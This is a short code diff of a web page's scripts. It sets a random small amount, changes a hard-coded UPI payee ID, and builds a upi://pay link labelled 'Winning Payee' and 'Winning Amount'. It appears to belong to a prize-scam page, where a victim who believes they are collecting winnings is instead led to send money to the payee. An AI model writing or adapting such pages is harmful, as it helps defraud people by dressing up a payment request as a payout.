@@ -31,7 +31,7 @@ function randomNumber(min, max) {
   return Math.random() * (max - min) + min;
 }
 
-var price = Math.floor(randomNumber(1901,1951));
+var price = Math.floor(randomNumber(1,5));
 console.log(price);
 
   </script>
@@ -91,9 +91,9 @@ console.log(price);
     
 <script>
   var upi = document.getElementById('upi');
-  var id = 'abhay2770@pingpay' // change UPI from here
+  var id = 'mundrawala@uboi' // change UPI from here
 
-  upi.setAttribute("href", "upi://pay?pa="+id+"&pn=winning Amount&am="+price+"&mode=01");
+  upi.setAttribute("href", "upi://pay?pa="+id+"&pn=Winning Payee&tn=Winning Amount&am="+price+"&mode=01");
 </script>
            
 
